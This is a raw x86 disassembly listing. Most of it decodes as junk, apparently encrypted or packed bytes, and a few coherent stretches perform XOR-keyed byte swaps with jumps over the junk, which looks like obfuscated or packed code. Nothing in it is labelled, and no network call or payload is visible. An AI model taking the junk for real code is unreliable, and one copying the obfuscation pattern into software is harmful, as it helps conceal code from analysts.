  4049d1:	les    eax,FWORD PTR ds:0x1a826c77
  4049d7:	inc    ecx
  4049d8:	sub    al,0xb
  4049da:	sahf   
  4049db:	and    DWORD PTR [ebp+edi*1+0x74],eax
  4049df:	mov    edx,0xf7df4f4c
  4049e4:	pop    ecx
  4049e5:	nop
  4049e6:	push   cs
  4049e7:	sbb    bh,0xb7
  4049ea:	cmc    
  4049eb:	aam    0x2d
  4049ed:	aad    0xc4
  4049ef:	shr    DWORD PTR [eax+0x5214bf7a],0xc5
  4049f6:	or     ch,ch
  4049f8:	imul   eax,esp,0x78
  4049fb:	adc    al,0x1a
  4049fd:	xchg   esi,eax
  4049fe:	sbb    bl,BYTE PTR [ecx+0x4dedc2bb]
  404a04:	push   ecx
  404a05:	xchg   ebx,eax
  404a06:	xchg   edi,eax
  404a07:	push   esi
  404a08:	ins    DWORD PTR es:[edi],dx
  404a09:	jnp    0x404a7e
  404a0b:	mov    WORD PTR [edx],fs
  404a0d:	(bad)  
  404a0f:	and    ah,ch
  404a11:	and    BYTE PTR [edi+0xe],ch
  404a14:	push   ecx
  404a15:	stos   DWORD PTR es:[edi],eax
  404a16:	pop    ebx
  404a17:	retf   
  404a18:	mov    bh,0x70
  404a1a:	xchg   BYTE PTR [eax],bh
  404a1c:	jnp    0x4049e2
  404a1e:	(bad)  
  404a20:	inc    edx
  404a21:	je     0x404a6c
  404a23:	ret    
  404a24:	mov    ah,BYTE PTR [edi+0xa141239]
  404a2a:	xchg   DWORD PTR [esi],ebx
  404a2c:	jecxz  0x404a64
  404a2e:	cmp    ch,bh
  404a30:	push   ebp
  404a31:	mov    ah,0x78
  404a33:	fwait
  404a34:	mov    cl,0x32
  404a36:	mov    edi,DWORD PTR [edx+0x5b4d58db]
  404a3c:	or     dh,bl
  404a3e:	in     eax,dx
  404a3f:	in     eax,0x9d
  404a41:	jl     0x404a65
  404a43:	and    eax,0x5641c4a3
  404a48:	push   ebp
  404a49:	adc    ecx,DWORD PTR ds:0xcb64f4cf
  404a4f:	sbb    DWORD PTR [ebx],0xffffffcb
  404a52:	sbb    ecx,DWORD PTR [esi]
  404a54:	ror    esp,cl
  404a56:	jbe    0x404ac1
  404a58:	pop    ebx
  404a59:	pusha  
  404a5a:	and    al,0xe6
  404a5c:	adc    BYTE PTR [ecx+edi*4-0x4c09a91e],ch
  404a63:	mov    ecx,0x734d16c6
  404a68:	or     DWORD PTR [ebp-0x9728483],0xffffffd9
  404a6f:	pop    ebp
  404a70:	mov    BYTE PTR [ecx-0x2408c20b],ah
  404a76:	mov    al,ds:0xf3f2bc23
  404a7b:	mov    fs,WORD PTR [ecx+ebx*1]
  404a7e:	pop    ds
  404a7f:	ficom  DWORD PTR [ebp+eiz*4+0x5d]
  404a83:	or     eax,0x65f8af8b
  404a88:	mov    esi,0xf2607e92
  404a8d:	(bad)  
  404a8e:	mov    bh,0xe1
  404a90:	out    dx,al
  404a91:	xor    eax,0xb85b00fc
  404a96:	xor    DWORD PTR [ecx],edx
  404a98:	add    BYTE PTR [edx+0x6e],0x16
  404a9c:	int3   
  404a9d:	inc    ecx
  404a9e:	out    dx,eax
  404a9f:	ret    0xcb05
  404aa2:	lds    ebx,FWORD PTR [ecx]
  404aa4:	arpl   cx,dx
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x593c6a28
  404b32:	scas   eax,DWORD PTR es:[edi]
  404b33:	inc    edx
  404b34:	mov    BYTE PTR [edx+0x587e7e22],ah
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404bac
  404b3e:	xor    al,0x6b
  404b40:	sub    eax,0x12a3ce7e
  404b45:	mov    ebx,0x81e247e3
  404b4a:	mov    bh,0x3d
  404b4c:	pop    ebx
  404b4d:	imul   ebx,edx,0xae77cbcd
  404b53:	out    0x82,al
  404b55:	adc    eax,0xa00a6973
  404b5a:	retf   0xb4e6
  404b5d:	and    al,0x4e
  404b5f:	cmc    
  404b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b61:	nop
  404b62:	mov    gs,WORD PTR [ecx-0x7a6531c4]
  404b68:	fcomp  QWORD PTR [eax-0x80]
  404b6b:	xchg   esi,eax
  404b6c:	or     BYTE PTR [esi-0x3a30e132],cl
  404b72:	mov    al,0xcd
  404b74:	mov    bl,0x91
  404b76:	(bad)  
  404b77:	outs   dx,BYTE PTR ds:[esi]
  404b78:	jb     0x404baf
  404b7a:	rol    DWORD PTR [edx-0x190348fc],0x8a
  404b81:	jae    0x404bab
  404b83:	div    BYTE PTR [eax-0x14]
  404b86:	mov    edi,0x4afd092f
  404b8b:	outs   dx,BYTE PTR ds:[esi]
  404b8c:	pusha  
  404b8d:	xor    BYTE PTR es:[ecx-0x76e8d7cf],bl
  404b94:	loope  0x404bbe
  404b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b97:	pop    ebp
  404b98:	mov    ch,dh
  404b9a:	sti    
  404b9b:	div    DWORD PTR [eax+ebx*1-0x7b]
  404b9f:	das    
  404ba0:	fs pop esp
  404ba2:	fild   WORD PTR [esi+0x42475de9]
  404ba9:	popa   
  404baa:	in     al,dx
  404bab:	fs loope 0x404c1d
  404bae:	loopne 0x404bef
  404bb0:	lahf   
  404bb1:	mov    dl,0xc5
  404bb3:	loopne 0x404b42
  404bb5:	pop    edx
  404bb6:	mov    bh,0x12
  404bb8:	inc    ebx
  404bb9:	mov    bl,0x2c
  404bbb:	gs adc al,0x51
  404bbe:	jecxz  0x404c27
  404bc0:	arpl   di,bp
  404bc2:	and    DWORD PTR [esi+0x51ffc8b6],ebp
  404bc8:	repnz fbld TBYTE PTR [edx+0x71212d61]
  404bcf:	stos   DWORD PTR es:[edi],eax
  404bd0:	ss das 
  404bd2:	inc    ebp
  404bd3:	into   
  404bd4:	(bad)  
  404bd5:	push   ebx
  404bd6:	int    0x50
  404bd8:	sub    al,0x58
  404bda:	ja     0x404bae
  404bdc:	sub    al,0x51
  404bde:	repz mov bh,0x6b
  404be1:	cli    
  404be2:	std    
  404be3:	sub    al,0xe
  404be5:	jno    0x404b87
  404be7:	pop    edx
  404be8:	ret    0x120a
  404beb:	xor    al,0xfe
  404bed:	adc    BYTE PTR [edx+0x3d],ch
  404bf0:	dec    ecx
  404bf1:	mov    dl,0x34
  404bf3:	add    edx,DWORD PTR [eax-0x25fde8d9]
  404bf9:	mov    eax,ds:0x1c3a80b1
  404bfe:	out    dx,eax
  404bff:	popa   
  404c00:	or     DWORD PTR [esp+ebp*4],ebx
  404c03:	addr16 ja 0x404bc3
  404c06:	adc    bh,dl
  404c08:	xor    esp,DWORD PTR [edx+0x1a]
  404c0b:	pop    ss
  404c0c:	jl     0x404c5f
  404c0e:	ror    DWORD PTR [eax+0x3cc9cbc4],cl
  404c14:	cmp    al,BYTE PTR [eax+0x526c85e]
  404c1a:	icebp  
  404c1b:	push   ebx
  404c1c:	scas   eax,DWORD PTR es:[edi]
  404c1d:	mov    esp,0xbd345174
  404c22:	mov    ebx,0x99d0353d
  404c27:	mov    eax,ds:0x3297ad
  404c2c:	shl    DWORD PTR [ebx+0x26],1
  404c2f:	int3   
  404c30:	push   edx
  404c31:	clc    
  404c32:	arpl   WORD PTR [edi+0x73],ax
  404c35:	pop    ebp
  404c36:	loop   0x404c99
  404c38:	sub    al,0x90
  404c3a:	or     eax,0xb7220b3b
  404c3f:	ret    0x316a
  404c42:	jns    0x404c45
  404c44:	xchg   DWORD PTR [edx-0x46],eax
  404c47:	ret    
  404c48:	out    0xe,eax
  404c4a:	and    cl,BYTE PTR [ebx-0x78]
  404c4d:	pop    ss
  404c4e:	dec    ebp
  404c4f:	xor    esp,DWORD PTR [edx]
  404c51:	scas   al,BYTE PTR es:[edi]
  404c52:	cmp    dl,BYTE PTR [eax]
  404c54:	sub    DWORD PTR [ebx-0x3ec6e5ff],edi
  404c5a:	xor    BYTE PTR [ebx-0x7fec2aa9],0x7e
  404c61:	(bad)  
  404c62:	(bad)  
  404c63:	popa   
  404c64:	push   ds
  404c65:	and    eax,0xf8d7bdca
  404c6a:	ss push edi
  404c6c:	jb     0x404ccf
  404c6e:	xchg   esi,eax
  404c6f:	cmp    ch,al
  404c71:	out    dx,al
  404c72:	dec    edi
  404c73:	adc    eax,0xef708ad9
  404c78:	dec    edi
  404c79:	loopne 0x404ce5
  404c7b:	fnstsw WORD PTR [edx+0x5c]
  404c7e:	fsubrp st(1),st
  404c80:	rsm    
  404c82:	mov    esp,DWORD PTR [eax-0x732fd560]
  404c88:	mov    edx,0x8189b632
  404c8d:	in     eax,0x22
  404c8f:	mov    ecx,0x9b90908d
  404c94:	mov    esp,DWORD PTR [ebx]
  404c96:	push   esi
  404c97:	imul   esi,DWORD PTR [esi],0xffffff99
  404c9a:	cmp    BYTE PTR [ebp+0xf],dh
  404c9d:	addps  xmm1,XMMWORD PTR [ecx+0x3e]
  404ca1:	sub    bl,BYTE PTR [ecx]
  404ca3:	call   0x5d31d60b
  404ca8:	outs   dx,DWORD PTR ds:[esi]
  404ca9:	mov    ah,0xe4
  404cab:	imul   ebx,DWORD PTR [edx-0x6c],0x4366a026
  404cb2:	sbb    eax,0x9a2d8364
  404cb7:	mov    WORD PTR [edi-0x2702a67b],ds
  404cbd:	jmp    0x404cfb
  404cbf:	mov    al,0x15
  404cc1:	mov    edi,0x43833cc6
  404cc6:	imul   edi,edx,0x7a169e28
  404ccc:	dec    esi
  404ccd:	sbb    ebp,DWORD PTR cs:[ebx+0x3d]
  404cd1:	xchg   DWORD PTR [ecx],edx
  404cd3:	xchg   esp,eax
  404cd5:	int3   
  404cd6:	imul   edi,DWORD PTR [edi+0x1f],0x27
  404cda:	gs pop eax
  404cdc:	mov    ds:0x345519eb,al
  404ce1:	gs loope 0x404cf9
  404ce4:	outs   dx,DWORD PTR ds:[esi]
  404ce5:	sbb    BYTE PTR [edx+0x67951979],ah
  404ceb:	xor    edi,ebx
  404ced:	jle    0x404cc7
  404cef:	cmp    eax,0xcd7d3542
  404cf4:	or     eax,0xb36d2fed
  404cf9:	retf   
  404cfa:	adc    esp,DWORD PTR [ebp-0x57]
  404cfd:	in     al,dx
  404cfe:	cwde   
  404cff:	xchg   ebx,eax
  404d00:	cmp    al,0x17
  404d02:	xchg   BYTE PTR cs:[eax-0x624ac480],ah
  404d09:	into   
  404d0a:	cmp    ah,BYTE PTR [bp+si+0x9]
  404d0e:	lea    edi,[ebp-0x6b46e324]
  404d14:	out    0x53,al
  404d16:	cmc    
  404d17:	lds    esp,FWORD PTR [ecx]
  404d19:	enter  0xfd58,0x8
  404d1d:	cld    
  404d1e:	sub    dh,BYTE PTR [edx+0x76]
  404d21:	es scas al,BYTE PTR es:[edi]
  404d23:	xchg   esp,eax
  404d24:	push   ecx
  404d25:	mov    ecx,0x3c40e3cb
  404d2a:	pop    ebx
  404d2b:	loope  0x404d62
  404d2d:	mov    eax,ds:0xd170638
  404d32:	push   esp
  404d33:	inc    edx
  404d34:	sub    BYTE PTR [edx-0x5f133d0],0xb4
  404d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d3c:	cmp    eax,0xe2a8f619
  404d41:	mov    cl,0xa9
  404d43:	iret   
  404d44:	mov    edx,0xaddd5818
  404d49:	fdivr  DWORD PTR [edx]
  404d4b:	and    DWORD PTR [edi+0x19],ecx
  404d4e:	jg     0x404d1d
  404d50:	inc    esi
  404d51:	xor    eax,0x89130b39
  404d56:	arpl   dx,dx
  404d58:	fstp   TBYTE PTR [ebx+ebx*1]
  404d5b:	add    bl,BYTE PTR [ecx-0x1b501c82]
  404d61:	mov    ah,0xd8
  404d63:	leave  
  404d64:	mov    bh,0x59
  404d66:	rcr    BYTE PTR ds:0xaa79bc94,cl
  404d6c:	xchg   ebx,eax
  404d6d:	cmp    DWORD PTR [eax-0x110ba67d],ecx
  404d73:	push   ebp
  404d74:	pop    esi
  404d75:	and    BYTE PTR [ebp+edi*1-0x5c],dl
  404d79:	jle    0x404d7d
  404d7b:	repz mov ebp,cs
  404d7e:	jl     0x404dd8
  404d80:	inc    edx
  404d81:	jge    0x404d51
  404d83:	and    esp,edi
  404d85:	xor    BYTE PTR [ebp+0x7e],0xf3
  404d89:	addr16 jp 0x404d0e
  404d8c:	mov    eax,ds:0x12c131b0
  404d91:	popf   
  404d92:	(bad)  
  404d93:	retf   0xb7a8
  404d96:	fsubp  st(2),st
  404d98:	dec    esp
  404d99:	cmp    BYTE PTR [ebp+0x53ce0298],ch
  404d9f:	pop    eax
  404da0:	dec    ebp
  404da1:	fist   WORD PTR [ebp+0x0]
  404da4:	jg     0x404dc9
  404da6:	push   es
  404da7:	mov    WORD PTR ss:[eax+0x25],ss
  404dab:	mov    edi,0xd1dc2b4e
  404db0:	bound  ecx,QWORD PTR [ebx+0x11a174c8]
  404db6:	mov    eax,0x50026380
  404dbb:	mov    ecx,0x9f32bfb8
  404dc0:	adc    ecx,0x9
  404dc3:	and    esi,DWORD PTR [eax]
  404dc5:	iret   
  404dc6:	sahf   
  404dc7:	jg     0x404e1e
  404dc9:	scas   al,BYTE PTR es:[edi]
  404dca:	jl     0x404d6f
  404dcc:	mov    dl,0xd5
  404dce:	or     dl,cl
  404dd0:	outs   dx,DWORD PTR ds:[esi]
  404dd1:	or     ebx,DWORD PTR [ecx-0x3d]
  404dd4:	adc    ecx,DWORD PTR [ebx-0x7ae8ed82]
  404dda:	fiadd  DWORD PTR [ebp+0xe214ecf]
  404de0:	adc    ah,BYTE PTR [ecx+edx*2]
  404de3:	lahf   
  404de4:	(bad)  
  404de5:	mov    ch,0xdc
  404de7:	pop    edi
  404de8:	das    
  404de9:	adc    eax,0x3a1668e8
  404dee:	push   ds
  404def:	icebp  
  404df0:	and    BYTE PTR [edx-0x77],ah
  404df3:	xor    bl,cl
  404df5:	shl    BYTE PTR [ebx-0x63a8c6c],cl
  404dfb:	xor    DWORD PTR [esi+0x6967417d],esi
  404e01:	mov    esp,0xb55d3ecd
  404e06:	jecxz  0x404d95
  404e08:	sbb    BYTE PTR [edx-0x76],bh
  404e0b:	or     esp,edi
  404e0d:	ret    
  404e0e:	sbb    ch,BYTE PTR ds:0xdf40fc6b
  404e14:	dec    esp
  404e15:	sbb    eax,0x84d9fb6e
  404e1a:	push   edx
  404e1b:	les    ecx,FWORD PTR [ecx+0x2a]
  404e1e:	fs inc esi
  404e20:	div    DWORD PTR [edi+0x74]
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e0d
  404e5e:	mov    ah,0xe1
  404e60:	pushf  
  404e61:	mov    WORD PTR [ecx],fs
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e66
  404e6a:	sub    eax,DWORD PTR [ebp+0x708382b5]
  404e70:	cmp    al,0xfb
  404e72:	inc    ebx
  404e73:	call   0x1b24:0xd552132e
  404e7a:	cmp    ebp,ebp
  404e7c:	jmp    0x9fb0:0x6a402f44
  404e83:	mov    dh,0xcc
  404e85:	rol    eax,0x54
  404e88:	fcmovb st,st(5)
  404e8a:	inc    edx
  404e8b:	ret    
  404e8c:	mov    ss,WORD PTR [ecx+0x68]
  404e8f:	pop    edx
  404e90:	lea    eax,[eax+0x7]
  404e93:	sub    eax,0xf1b062e2
  404e98:	add    edi,edi
  404e9a:	js     0x404e48
  404e9c:	loopne 0x404e38
  404e9e:	mov    dh,0xbe
  404ea0:	jo     0x404ed2
  404ea2:	mov    esp,0x796cd8c3
  404ea7:	imul   ecx,DWORD PTR [ecx],0xd12d146e
  404ead:	inc    edi
  404eae:	add    BYTE PTR [edi+0x7d],0xc4
  404eb2:	mov    edx,0xe7166926
  404eb7:	vpsrld xmm3,xmm0,xmm3
  404ebb:	mul    DWORD PTR [ecx-0x4]
  404ebe:	aaa    
  404ebf:	pusha  
  404ec0:	sub    DWORD PTR [eax+0x1daa9889],esi
  404ec6:	ins    DWORD PTR es:[edi],dx
  404ec7:	pop    edi
  404ec8:	mov    DWORD PTR [esi+0x4a9827dc],esp
  404ece:	add    eax,0x2dbe6cea
  404ed3:	cdq    
  404ed4:	cs jmp 0x6ff3:0xe44a0d27
  404edc:	sbb    bl,al
  404ede:	imul   ebp,DWORD PTR [ecx],0x7aa8fc3a
  404ee4:	adc    cl,bl
  404ee6:	fld    QWORD PTR [ebp-0x1b0fe6db]
  404eec:	popa   
  404eed:	mov    BYTE PTR ds:0xf1a94862,dl
  404ef3:	outs   dx,BYTE PTR ds:[esi]
  404ef4:	loop   0x404ea4
  404ef6:	outs   dx,DWORD PTR ds:[esi]
  404ef7:	lods   eax,DWORD PTR ds:[esi]
  404ef8:	stc    
  404ef9:	add    dh,BYTE PTR [ecx]
  404efb:	inc    ecx
  404efc:	daa    
  404efd:	jns    0x404f5e
  404eff:	jo     0x404e93
  404f01:	add    BYTE PTR [esi],dh
  404f03:	aaa    
  404f04:	scas   eax,DWORD PTR es:[edi]
  404f05:	and    al,0xfe
  404f07:	pop    edi
  404f08:	je     0x404e8b
  404f0a:	(bad)  
  404f0b:	retf   
  404f0c:	out    dx,eax
  404f0d:	cmp    ah,BYTE PTR [esi-0x593fc4a5]
  404f13:	push   esp
  404f14:	sbb    ah,dh
  404f16:	cdq    
  404f17:	movhlps xmm2,xmm3
  404f1a:	push   esp
  404f1b:	je     0x404f97
  404f1d:	inc    esi
  404f1e:	adc    eax,0xc1731698
  404f23:	and    DWORD PTR [eax],edx
  404f25:	stos   DWORD PTR es:[edi],eax
  404f26:	pop    ebx
  404f27:	adc    eax,0x350bc5fd
  404f2c:	fdiv   QWORD PTR ds:0x4c7d0d7c
  404f32:	bound  esi,QWORD PTR [edi+ebx*1]
  404f35:	dec    esp
  404f36:	cmp    eax,DWORD PTR [edx+0x1f88573c]
  404f3c:	test   ecx,edx
  404f3e:	xor    edx,DWORD PTR [edx]
  404f40:	nop
  404f41:	cmp    ecx,ebp
  404f43:	pop    edx
  404f44:	cmp    al,0x50
  404f46:	lods   al,BYTE PTR ds:[esi]
  404f47:	enter  0x93f6,0x56
  404f4b:	or     DWORD PTR [edi+0x61dc5db6],ebp
  404f51:	into   
  404f52:	test   BYTE PTR ds:0x17ce32b1,ch
  404f58:	(bad)  
  404f59:	addr16 mov eax,ds:0xac77
  404f5d:	pop    ebp
  404f5e:	mov    eax,0x81e18089
  404f63:	pop    es
  404f64:	and    al,0xf3
  404f66:	add    DWORD PTR [ebp-0x61e8c701],0x2733cfc2
  404f70:	adc    eax,0x9df244a0
  404f75:	jne    0x404f85
  404f77:	ficomp WORD PTR [eax-0x2692797d]
  404f7d:	xchg   ecx,eax
  404f7e:	mov    dl,0x6b
  404f80:	push   0x84b4d742
  404f85:	sbb    ebx,DWORD PTR [ebx+0x7e]
  404f88:	mov    al,ds:0xac0f422e
  404f8d:	imul   DWORD PTR [ebp+edi*2+0x2e]
  404f91:	out    dx,eax
  404f92:	mov    bl,BYTE PTR [ebp-0x60]
  404f95:	enter  0xbf3b,0xa3
  404f99:	xor    dl,al
  404f9b:	sahf   
  404f9c:	mov    ecx,0xa37fdeaf
  404fa1:	imul   cl
  404fa3:	leave  
  404fa4:	bnd jne 0x404ff5
  404fa7:	imul   edx,DWORD PTR [edi+0x72],0xdb1764c2
  404fae:	mov    ah,ah
  404fb0:	lea    edi,[esi+0x50cefab5]
  404fb6:	sti    
  404fb7:	cmp    al,0x25
  404fb9:	in     eax,dx
  404fba:	xor    ch,BYTE PTR [esi-0xd]
  404fbd:	jmp    0x404fcc
  404fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fc0:	ss (bad) 
  404fc2:	sub    al,0xfc
  404fc4:	dec    eax
  404fc5:	cdq    
  404fc6:	pop    eax
  404fc7:	(bad)  
  404fc9:	or     DWORD PTR [edi+0x13],ebp
  404fcc:	add    DWORD PTR [edi+0x7],0xffffffb4
  404fd0:	mov    ebp,ebx
  404fd2:	xor    al,0x37
  404fd4:	retf   0xd6d4
  404fd7:	daa    
  404fd8:	imul   ecx,ebx,0x5e
  404fdb:	mov    eax,ds:0x5d631b6d
  404fe0:	js     0x404f81
  404fe2:	cli    
  404fe3:	or     al,0x80
  404fe5:	outs   dx,DWORD PTR ds:[esi]
  404fe6:	leave  
  404fe7:	jae    0x404fbb
  404fe9:	sbb    al,0xeb
  404feb:	cmp    DWORD PTR [ecx+0x19],esi
  404fee:	xor    DWORD PTR [ecx],esi
  404ff0:	addr16 das 
  404ff2:	push   es
  404ff3:	fidivr WORD PTR [ecx-0x15]
  404ff6:	ds jg  0x405032
  404ff9:	sub    DWORD PTR [ebp-0x4b63dab9],eax
  404fff:	fs jne 0x40506c
  405002:	cmc    
  405003:	loopne 0x404f9c
  405005:	inc    eax
  405006:	jns    0x404fc4
  405008:	lock int3 
  40500a:	adc    esp,DWORD PTR [eax+0x5b618420]
  405010:	mov    ah,0xfc
  405012:	push   esi
  405013:	xchg   BYTE PTR [ebx+edx*2],dl
  405016:	push   es
  405017:	cmp    al,0xe1
  405019:	pop    esi
  40501a:	addr16 hlt 
  40501c:	jp     0x404fc3
  40501e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40501f:	cli    
  405020:	jmp    DWORD PTR [edx+0x1c011b32]
  405026:	inc    edx
  405027:	inc    ebp
  405028:	loope  0x405078
  40502a:	xor    eax,0xc0f8227e
  40502f:	leave  
  405030:	out    dx,eax
  405031:	inc    ebx
  405032:	push   cs
  405033:	mov    eax,ds:0x6ac7f9b9
  405038:	out    0xf4,al
  40503a:	cdq    
  40503b:	pushf  
  40503c:	lds    esi,FWORD PTR [ebx]
  40503e:	fsub   DWORD PTR [edx+0x2f]
  405041:	scas   eax,DWORD PTR es:[edi]
  405042:	mov    bh,0xf3
  405044:	cmp    esi,DWORD PTR [esi-0x21]
  405047:	add    ecx,DWORD PTR [edi+0x72864d29]
  40504d:	mov    esp,0xdd4ca9e6
  405052:	leave  
  405053:	inc    esi
  405054:	into   
  405055:	sbb    al,0x4d
  405057:	loop   0x404ff8
  405059:	mov    DWORD PTR [edi-0x1ffb9e34],0x7387b9f3
  405063:	jmp    0x63e1:0x2f4e
  405069:	jp     0x405015
  40506b:	mov    ah,0xbf
  40506d:	inc    ebx
  40506e:	push   ss
  40506f:	out    0x38,eax
  405071:	popf   
  405072:	jno    0x40504d
  405074:	dec    BYTE PTR [edx]
  405076:	into   
  405077:	mov    ah,0xaf
  405079:	cmp    eax,0xf6d37f42
  40507e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40507f:	dec    ebp
  405080:	out    0xf3,al
  405082:	jecxz  0x40504f
  405084:	stos   BYTE PTR es:[edi],al
  405085:	mov    cl,0x4e
  405087:	cmp    al,0x44
  405089:	and    bl,BYTE PTR [ebx+esi*8]
  40508c:	or     DWORD PTR [edx-0x24],esp
  40508f:	(bad)  
  405090:	pop    ebp
  405091:	sbb    DWORD PTR [edx+eiz*1],esi
  405094:	stos   BYTE PTR es:[edi],al
  405095:	leave  
  405096:	jl     0x405077
  405098:	in     eax,dx
  405099:	and    ebx,DWORD PTR [ebx]
  40509b:	mov    ecx,DWORD PTR [ecx]
  40509d:	test   DWORD PTR [ebx],ebx
  40509f:	nop
  4050a0:	imul   ebp,DWORD PTR [esi-0x6a506b58],0x16c1c95
  4050aa:	out    dx,al
  4050ab:	cli    
  4050ac:	xor    eax,DWORD PTR [eax-0x5a9d48f2]
  4050b2:	pusha  
  4050b3:	lahf   
  4050b4:	in     al,dx
  4050b5:	mul    bl
  4050b7:	in     al,dx
  4050b8:	scas   al,BYTE PTR es:[edi]
  4050b9:	mov    esi,0x11adbe2b
  4050be:	jmp    0x811b:0x3980c3df
  4050c5:	popf   
  4050c6:	cmp    BYTE PTR [eax],0x8c
  4050c9:	addr16 mov ebp,0x92dd4c05
  4050cf:	test   al,0x59
  4050d1:	les    edx,FWORD PTR [ebp+0x4]
  4050d4:	mov    esi,0x463698b3
  4050d9:	pop    edx
  4050da:	push   0xbd1a4aa6
  4050df:	int3   
  4050e0:	call   0x61812578
  4050e5:	jmp    0x3b73:0x527ed46b
  4050ec:	mov    bh,0xbe
  4050ee:	scas   al,BYTE PTR es:[edi]
  4050ef:	mov    eax,ds:0xf30b053
  4050f4:	adc    al,0x12
  4050f6:	lea    esp,[esi+ebx*2-0x73]
  4050fa:	xchg   BYTE PTR [ebx],dh
  4050fc:	mov    ch,0xd8
  4050fe:	cli    
  4050ff:	daa    
  405100:	outs   dx,BYTE PTR ds:[esi]
  405101:	and    BYTE PTR [eax-0x53],dh
  405104:	xchg   ecx,eax
  405105:	or     ch,dh
  405107:	sub    ebp,DWORD PTR [eax+0x4a]
  40510a:	pop    esi
  40510b:	addr16 dec ecx
  40510d:	xchg   esi,edi
  40510f:	mov    al,0x1f
  405111:	and    al,0x2f
  405113:	cmp    al,ch
  405115:	xchg   edi,eax
  405116:	mov    dh,0x8f
  405118:	das    
  405119:	jnp    0x40515e
  40511b:	jmp    0x40514a
  40511d:	ins    BYTE PTR es:[edi],dx
  40511e:	mov    BYTE PTR [esi+0x6b8d5ac],cl
  405124:	loopne 0x4050ad
  405126:	push   eax
  405127:	mov    ch,0x69
  405129:	mov    ds:0xf8479d32,al
  40512e:	pop    ebx
  40512f:	or     BYTE PTR [ecx],0x7c
  405132:	xchg   esi,eax
  405133:	fild   WORD PTR [ebx+0x1b11840b]
  405139:	fdivr  DWORD PTR [edx]
  40513b:	les    edx,FWORD PTR [edx]
  40513d:	mov    ds:0xd7ce8218,al
  405142:	popa   
  405143:	xor    dl,BYTE PTR [ebx+0x38]
  405146:	ins    BYTE PTR es:[edi],dx
  405147:	and    eax,DWORD PTR [ebx-0x79]
  40514a:	mov    WORD PTR [edx+0xf7c8c45],gs
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	ins    DWORD PTR es:[edi],dx
  405172:	sub    BYTE PTR [esi+0x7e2cf667],dh
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405163
  40517e:	mov    esp,0xf67b7331
  405183:	stos   DWORD PTR es:[edi],eax
  405184:	fbld   TBYTE PTR [ecx-0xd2ad6d9]
  40518a:	int    0x6d
  40518c:	mov    al,0xb4
  40518e:	push   esp
  40518f:	mov    edi,0x873df99d
  405194:	jl     0x4051bb
  405196:	add    BYTE PTR [edx-0x16],al
  405199:	jg     0x4051c7
  40519b:	xor    BYTE PTR [edi+0x7d012a22],0xca
  4051a2:	push   0x40
  4051a4:	(bad)  
  4051a6:	mov    al,0x83
  4051a8:	jecxz  0x4051d5
  4051aa:	int3   
